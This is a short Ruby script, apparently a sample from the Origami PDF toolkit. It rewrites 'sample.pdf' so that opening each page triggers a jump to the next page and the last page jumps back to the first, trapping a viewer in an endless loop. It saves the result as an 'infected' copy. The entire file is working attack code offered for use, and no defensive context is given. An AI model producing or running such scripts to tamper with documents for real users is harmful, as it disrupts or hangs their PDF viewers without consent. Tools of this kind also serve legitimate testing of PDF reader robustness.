#!/usr/bin/env ruby

$: << "../../parser"
require 'parser.rb'
include Origami

pdf = PDF.read("sample.pdf", :verbosity => Parser::VERBOSE_DEBUG )

  index = 1
  pages = pdf.pages
  pages.each { |page|
    page.onOpen(Action::GoTo.new(Destination::GlobalFit.new pages[index].reference)) unless index == pages.size

    index = index + 1
  }
  
  pages.last.onOpen(Action::GoTo.new(Destination::GlobalFit.new(pages.first.reference)))

  infected_name = "loopgoto_" + pdf.filename
 
  pdf.saveas(infected_name)
  
  puts "Infected copy saved as #{infected_name}."
